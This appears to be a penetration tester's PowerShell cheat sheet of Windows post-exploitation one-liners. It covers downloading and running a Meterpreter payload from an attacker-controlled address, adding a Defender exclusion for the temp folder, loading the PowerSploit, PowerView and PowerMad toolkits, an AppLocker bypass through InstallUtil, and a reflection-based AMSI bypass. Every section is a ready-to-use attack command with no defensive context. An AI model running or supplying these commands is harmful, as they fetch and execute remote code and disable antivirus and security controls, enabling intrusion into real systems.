# Powershell Download and Execute Meterpreter
```powershell
powershell invoke-webrequest -uri http://192.168.x.x/SI.exe -outfile C:\windows\temp\x.exe ; C:\windows\temp\x.exe
```

# Add AV Exception To A Folder
```powershell
Add-MpPreference -ExclusionPath "C:\windows\temp\"
```

# Export PowerSploit and Import
```powershell
Expand-Archive -Path C:\windows\temp\PowerSploit.zip -Destinationpath C:\windows\temp\;Import-Module C:\windows\temp\PowerSploit\powersploit.psd1;Import-Module C:\windows\temp\PowerSploit\Recon\PowerView.ps1;
```

# Export PowerMad and Import
```powershell
Expand-Archive -Path C:\windows\temp\PowerMad.zip -Destinationpath C:\windows\temp\;Import-Module C:\windows\temp\PowerMad\PowerMad.ps1;
```

# Applocker Bypass
```powershell
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\windows\\temp\\EXEHERE
```

# AMSI Bypass
```powershell
$a=[Ref].Assembly.GetTypes() ; Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}; $d=$c.GetFields('NonPublic,Static') ; Foreach($e in $d) {if ($e.Name -like "*initFailed") {$f=$e}} ; $f.SetValue($null,$true)
```
